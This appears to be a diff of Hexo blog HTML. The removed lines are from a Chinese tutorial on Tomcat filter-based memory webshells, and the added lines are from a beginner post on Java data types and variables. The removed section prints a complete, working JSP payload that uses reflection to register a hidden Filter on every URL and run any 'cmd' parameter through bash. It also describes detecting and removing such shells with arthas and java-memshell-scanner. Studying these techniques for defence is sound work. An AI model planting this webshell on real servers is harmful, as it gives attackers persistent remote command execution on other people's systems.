-<li>利用 FilterDef 对 Filter 进行一个封装</li>
-<li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li>
-<li>创建 FilterMap，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps 中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li>
-</ol>
-<p>每次请求 creatFilterChain 都会依据此动态生成一个过滤链，而 StandardContext 又会一直保留在 Tomcat 生命周期结束，所以我们的内存马就可以一直驻留下去，直到 Tomcat 重启</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"><span class="comment">// 首先判断名字是否存在，如果不存在我们就进行注入</span></span><br><span class="line">  <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 创建恶意 Filter</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个filtermap</span></span><br><span class="line"><span class="comment">         * 设置filter的名字和对应的urlpattern</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">            <span class="comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span></span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filtermap 添加到 filterMaps 中的第一个位置</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filter名和配置好的filterConfig传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">      filterConfigs.put(name,filterConfig);</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
-
-<p>ps：前文说到该方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br></pre></td></tr></table></figure>
-
-<p>最终内存马如下：</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;y0lo&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>开启服务，访问 filterdemo02.jsp 显示注入成功</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308205302333.png" alt="image-20220308205302333"></p>
-<p>然后只需 <code>?cmd=Command</code> 即可执行我们的命令</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308205349049.png" alt="image-20220308205349049"></p>
-<h2 id="0x05-排查内存马的几个方法"><a href="#0x05-排查内存马的几个方法" class="headerlink" title="0x05 排查内存马的几个方法"></a>0x05 排查内存马的几个方法</h2><p>参考链接：<a target="_blank" rel="noopener" href="https://syst1m.com/post/memory-webshell/#arthas">https://syst1m.com/post/memory-webshell/#arthas</a></p>
-<h4 id="arthas"><a href="#arthas" class="headerlink" title="arthas"></a>arthas</h4><p>项目链接：<a target="_blank" rel="noopener" href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></p>
-<p>我们可以利用该项目来检测我们的内存马</p>
-<p>下载<code>arthas-boot.jar</code>，然后用<code>java -jar</code>的方式启动：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://arthas.aliyun.com/arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>
-
-<p>这里选择我们 Tomcat 的进程</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308210616610.png" alt="image-20220308210616610"></p>
-<p>通过<code>mbean</code>命令，可以便捷的查看或监控 <strong>Mbean</strong> 的属性信息（可以查看异常<code>Filter</code>&#x2F;<code>Servlet</code>节点）</p>
+<p><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313173851903.png" alt="image-20220313173851903"></p>
+<p>八大基本数据类型</p>
 <ul>
-<li>mbean | grep Filter</li>
-<li>mbean | grep Servlet</li>
+<li>整数：int、byte、short、long    （Integer、Byte是一个类）</li>
+<li>浮点数：float、double</li>
+<li>字符：char    （String不是基本数据类型，String是一个类）</li>
+<li>布尔：boolean</li>
 </ul>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308210552032.png" alt="image-20220308210552032"></p>
-<p>利用 <code>sc *.Filter</code> 进行模糊搜索，会列出所有调用了 Filter 的类？</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308210826334.png" alt="image-20220308210826334"></p>
-<p>利用<code>jad --source-only org.apache.jsp.filterdemo02_jsp</code>直接将 Class 进行反编译</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308211007618.png" alt="image-20220308211007618"></p>
-<p>同时也可以进行监控 ，当我们访问 url 就会输出监控结果</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308211141247.png" alt="image-20220308211141247"></p>
-<h4 id="java-memshell-scanner"><a href="#java-memshell-scanner" class="headerlink" title="java-memshell-scanner"></a>java-memshell-scanner</h4><p>项目链接：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p>
-<p>c0ny1 师傅写的检测内存马的工具，能够检测并且进行删除，是一个非常方便的工具</p>
-<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210402120745640.png" alt="image-20210402120745640"></p>
-<p>该工具是由 jsp 实现的，我们这里主要来学习一下 c0ny1 师傅 删除内存马的逻辑</p>
-<p>检测是通过遍历 filterMaps 中的所有 filterMap 然后显示出来，让我们自己认为判断，所以这里提供了 dumpclass</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210402121540671.png" alt="image-20210402121540671"></p>
-<p>删除的话，这里主要是通过反射调用 StandardContext#removeFilterDef 方法来进行删除</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210402121710447.png" alt="image-20210402121710447"></p>
-<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210402121845672.png" alt="image-20210402121845672"></p>
-<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>filter类型的内存马只是内存马的一种，本文中内存马还是需要上传 jsp 来生效，但是实际上利用方式远不止这样，我们还可以借助各种反序列化来动态注册 Filter 等。</p>
+<h3 id="数据类型扩展"><a href="#数据类型扩展" class="headerlink" title="数据类型扩展"></a>数据类型扩展</h3><ul>
+<li><p>整数扩展</p>
+<ul>
+<li>二进制0b、八进制0、十六进制0x</li>
+</ul>
+</li>
+<li><p>浮点数扩展</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> <span class="variable">f</span> <span class="operator">=</span> <span class="number">0.1f</span>;  <span class="comment">// 0.1</span></span><br><span class="line"><span class="type">double</span> <span class="variable">d</span>  <span class="operator">=</span> <span class="number">1.0</span>/<span class="number">10</span>; <span class="comment">// 0.1</span></span><br><span class="line"></span><br><span class="line">System.out.println(f==d); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="type">float</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="number">233333333333333333333f</span>;</span><br><span class="line"><span class="type">float</span> <span class="variable">d2</span> <span class="operator">=</span> d1 + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(d1==d2); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>BingDecimal 数学工具类</li>
+</ul>
+</li>
+<li><p>字符扩展</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="string">&#x27;中&#x27;</span>;</span><br><span class="line"></span><br><span class="line">System.out.println((<span class="type">int</span>) c1); <span class="comment">// 97</span></span><br><span class="line">System.out.println((<span class="type">int</span>) c2); <span class="comment">// 20013</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="string">&#x27;\u0061&#x27;</span>;</span><br><span class="line">System.out.println(c3); <span class="comment">// a</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Unicode编码   2字节  0-65536</li>
+<li>转移字符<ul>
+<li>\t    制表符</li>
+<li>\n   换行符</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>String</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">System.out.println(sa == sb); <span class="comment">// false</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sd</span> <span class="operator">=</span> <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">System.out.println(sc == sd); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>boolean</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="literal">true</span>)&#123;&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><ul>
+<li><p>由于Java是强类型语言，所以要进行有些运算的时候，需要用到类型转换。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">低 -------------------------------&gt; 高</span><br><span class="line">byte,short,char -&gt; int -&gt; long -&gt; float -&gt; double</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line"><span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">byte</span>)i; <span class="comment">// 内存溢出</span></span><br><span class="line">System.out.println(b); <span class="comment">// -128</span></span><br></pre></td></tr></table></figure>
+
+<p>注意点：</p>
+<ul>
+<li>低 -&gt; 高 自动转换</li>
+<li>高 -&gt; 低 需要强制转换</li>
+<li>不能对布尔值进行转换</li>
+<li>不能把对象类型转换为不相干的类型</li>
+<li>转换的时候可能存在内存溢出，或者精度问题！</li>
+</ul>
+</li>
+</ul>
+<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul>
+<li>变量是什么：就是可以变换的量！</li>
+<li>Java是一种强类型语言，每个变量都必须声明其类型。</li>
+<li>Java变量是程序中最基本的存储单元，其要素包括变量名，变量类型和作用域</li>
+</ul>
+<p><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313210633071.png" alt="image-20220313210633071"></p>
+<p>注意事项：</p>
+<ul>
+<li>每个变量都有类型，类型可以是基本类型，也可以是引用类型</li>
+<li>变量名必须是合法的标识符。</li>
+<li>变量声明是一条完整的语句，因此每一个声明都必须以分号结束。</li>
+</ul>
+<h3 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h3><ul>
+<li>类变量</li>
+<li>实例变量</li>
+<li>局部变量</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span>()&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span> <span class="number">2500</span>; <span class="comment">// 类变量</span></span><br><span class="line">    String name; <span class="comment">// 实例变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>; <span class="comment">// 局部变量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><ul>
+<li>常量（Constant）：初始化（initialize）后不能再改变值！不会变动的值。</li>
+<li>所谓常量可以理解成一种特殊的变量，它的值被设定后，在程序运行过程中不允许被改变。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> 类型 常量名 = 常量值;</span><br><span class="line"><span class="keyword">final</span> <span class="type">double</span> <span class="variable">PI</span> <span class="operator">=</span> <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="变量的命名规范"><a href="#变量的命名规范" class="headerlink" title="变量的命名规范"></a>变量的命名规范</h3><ul>
+<li>所有变量、方法、类名：见名知意</li>
+<li>类成员变量；首字母小写和驼峰原则：monthSalary 除了第一单词以外，后面的单词首字母大写 lastName</li>
+<li>局部变量：首字母小写和驼峰原则</li>
+<li>常量：大写字母和下划线：MAX_VALUE</li>
+<li>类名：首字母大写和驼峰原则，Man，GoodMan</li>
+<li>方法名：首字母小写和驼峰原则：run()，runRun()</li>
+</ul>
+<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul>
+<li>Java 语言支持如下运算符：<ul>
